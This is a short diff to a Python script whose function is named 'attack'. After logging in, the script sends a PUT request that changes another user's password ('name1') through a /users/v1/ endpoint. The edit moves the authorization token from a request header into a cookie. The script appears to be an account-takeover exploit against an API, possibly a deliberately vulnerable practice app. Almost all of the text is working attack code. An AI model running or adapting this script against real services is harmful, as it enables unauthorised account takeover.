@@ -25,10 +25,12 @@ def login(url):
 def attack(url):
     username = "name1"
     token = login(url)
-    print(token)
+
+    cookies = {
+        "Authorization": token,
+    }
 
     headers = {
-        "Authorization": token,
         "Content-Type": "application/json",
     }
 
@@ -36,7 +38,7 @@ def attack(url):
         "password": "test123!",
     }
 
-    r = requests.put(url + "/users/v1/" + username + "/password", data=json.dumps(data), headers=headers)
+    r = requests.put(url + "/users/v1/" + username + "/password", data=json.dumps(data), headers=headers, cookies=cookies)
     print(r.text)
 
 
